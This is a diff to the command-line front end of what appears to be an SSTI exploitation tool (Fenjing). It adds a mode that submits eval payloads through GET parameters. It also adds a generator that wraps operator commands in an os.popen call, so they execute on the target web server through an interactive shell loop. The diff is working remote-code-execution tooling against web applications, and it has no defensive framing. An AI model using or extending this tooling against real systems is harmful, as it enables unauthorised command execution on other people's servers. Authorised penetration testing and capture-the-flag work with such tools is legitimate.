@@ -9,6 +9,8 @@ from functools import partial
 
 import click
 
+from fenjing.payload_gen import generate
+
 
 from .form import get_form
 from .cracker import Cracker
@@ -67,7 +69,24 @@ def cmd_exec_submitter(
     logger.info("Submit payload %s", colored("blue", payload))
     if not will_print:
         payload_wont_print = (
-            "Payload generator says that this " + "payload %s command execution result."
+            "Payload generator says that this payload %s command execution result."
+        )
+        logger.warning(payload_wont_print, colored("red", "won't print"))
+    result = submitter.submit(payload)
+    assert result is not None
+    return result.text
+
+def cmd_exec_generate_func(
+    cmd: str, submitter: Submitter, generate_func: Callable, will_print: bool
+) -> str:
+    payload = generate_func(cmd)
+    if payload is None:
+        logger.warning("%s generating payload.", colored("red", "Failed"))
+        return ""
+    logger.info("Submit payload %s", colored("blue", payload))
+    if not will_print:
+        payload_wont_print = (
+            "This payload %s command execution result."
         )
         logger.warning(payload_wont_print, colored("red", "won't print"))
     result = submitter.submit(payload)
@@ -205,6 +224,9 @@ def get_config(
 @click.option(
     "--detect-mode", default=DETECT_MODE_ACCURATE, help="分析模式，可为accurate或fast"
 )
+@click.option(
+    "--eval-args-payload", default=False, is_flag=True, help="是否在GET参数中传递Eval payload"
+)
 @click.option("--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent")
 @click.option("--header", default=[], multiple=True, help="请求时使用的Headers")
 @click.option("--cookies", default="", help="请求时使用的Cookie")
@@ -218,6 +240,7 @@ def crack(
     exec_cmd: str,
     interval: float,
     detect_mode: str,
+    eval_args_payload: bool,
     user_agent: str,
     header: tuple,
     cookies: str,
@@ -243,7 +266,7 @@ def crack(
     tamperer = None
     if tamper_cmd:
         tamperer = shell_tamperer(tamper_cmd)
-    found, submitter, full_payload_gen = False, None, None
+    found, submitter, result = False, None, None
     for input_field in form["inputs"]:
         submitter = FormSubmitter(url, form, input_field, requester)
         if tamperer:
@@ -252,20 +275,35 @@ def crack(
         if not cracker.has_respond():
             logger.info("Test input field %s failed, continue...", input_field)
             continue
-        full_payload_gen = cracker.crack()
-        if not full_payload_gen:
+        if eval_args_payload:
+            result = cracker.crack_eval_args()
+        else:
+            result = cracker.crack()
+        if not result:
             logger.info("Test input field %s failed, continue...", input_field)
             continue
         found = True
     if not found:
         logger.warning("Test form failed...")
         return
-    assert submitter is not None and full_payload_gen is not None
-    cmd_exec_func = partial(
-        cmd_exec_submitter,
-        submitter=submitter,
-        full_payload_gen=full_payload_gen,
-    )
+    assert submitter is not None and result is not None
+    if eval_args_payload:
+        assert isinstance(result,tuple)
+        full_payload_gen, submitter, will_print = result
+        cmd_exec_func = partial(
+            cmd_exec_generate_func,
+            submitter = submitter,
+            generate_func = lambda x: "__import__('os').popen({}).read()".format(repr(x)),
+            will_print = will_print
+        )
+    else:
+        assert isinstance(result, FullPayloadGen)
+        full_payload_gen = result
+        cmd_exec_func = partial(
+            cmd_exec_submitter,
+            submitter=submitter,
+            full_payload_gen=full_payload_gen,
+        )
     if exec_cmd == "":
         interact(cmd_exec_func)
     else:
